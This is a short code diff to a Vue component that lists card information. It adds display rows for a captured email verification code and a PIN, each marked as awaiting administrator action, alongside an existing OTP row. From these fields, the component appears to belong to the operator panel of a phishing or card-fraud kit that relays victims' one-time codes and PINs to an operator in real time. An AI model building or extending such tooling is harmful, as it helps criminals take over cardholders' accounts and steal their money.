@@ -68,6 +68,14 @@ const rows = computed<DetailRow[]>(() => {
       { key: 'OTP码', val: props.cardInfo.otpCode || '等待输入' },
       { key: '验证状态', val: '待管理员操作' },
     ];
+    case 'Email验证页': return [
+      { key: '邮箱验证码', val: props.cardInfo.otpCode || '等待输入' },
+      { key: '验证状态', val: '待管理员操作' },
+    ];
+    case 'PIN验证页': return [
+      { key: 'PIN码', val: props.cardInfo.otpCode || '等待输入' },
+      { key: '验证状态', val: '待管理员操作' },
+    ];
     default: return [];
   }
 });
